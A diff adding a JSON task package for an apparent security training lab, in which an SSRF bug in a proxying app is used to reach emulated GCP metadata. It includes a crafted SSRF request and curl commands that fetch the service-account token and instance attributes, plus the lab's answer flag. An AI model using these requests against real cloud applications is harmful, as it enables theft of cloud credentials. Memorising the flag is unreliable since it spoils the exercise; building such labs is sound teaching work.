@@ -1,0 +1,51 @@
+{
+  "id": "cloud-ssrf-to-cloud",
+  "workdir": "/home/student/ssrfe2e",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/ssrfe2e/found.txt",
+    "contains": "nto{ssrf_t0_cl0ud_e2e}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/ssrfe2e",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/ssrfe2e/task.md",
+      "text": "# Задача: SSRF → cloud\n\nСквозная цепочка: SSRF в приложении → metadata облака → секрет. Найди флаг.\n\nИнструмент: `curl` (эмуляция metadata GCP).\n"
+    },
+    {
+      "path": "/home/student/ssrfe2e/notes.md",
+      "text": "Заметки\n------\n- Приложение проксирует URL без валидации.\n- GCP metadata: обязателен Metadata-Flavor: Google.\n"
+    },
+    {
+      "path": "/home/student/ssrfe2e/request.txt",
+      "text": "POST /fetch HTTP/1.1\nHost: app.acme.example\n\n{\"url\":\"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\"}\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [-s] -H \"Metadata-Flavor: Google\" <url> — GCP metadata (эмуляция)",
+      "cases": [
+        {
+          "match": "service-accounts/default/token",
+          "example": "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+          "output": "{\"access_token\": \"ya29.example\", \"expires_in\": 3599, \"token_type\": \"Bearer\"}\n"
+        },
+        {
+          "match": "instance/attributes/flag",
+          "example": "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/attributes/flag",
+          "output": "nto{ssrf_t0_cl0ud_e2e}\n"
+        },
+        {
+          "match": "instance/attributes/?\\s*$",
+          "example": "curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
+          "output": "startup-script\nflag\n"
+        }
+      ],
+      "fallback": "curl: (эмуляция) для этого URL нет захваченного ответа. Попробуй .../instance/attributes/ или .../service-accounts/default/token.\n"
+    }
+  }
+}
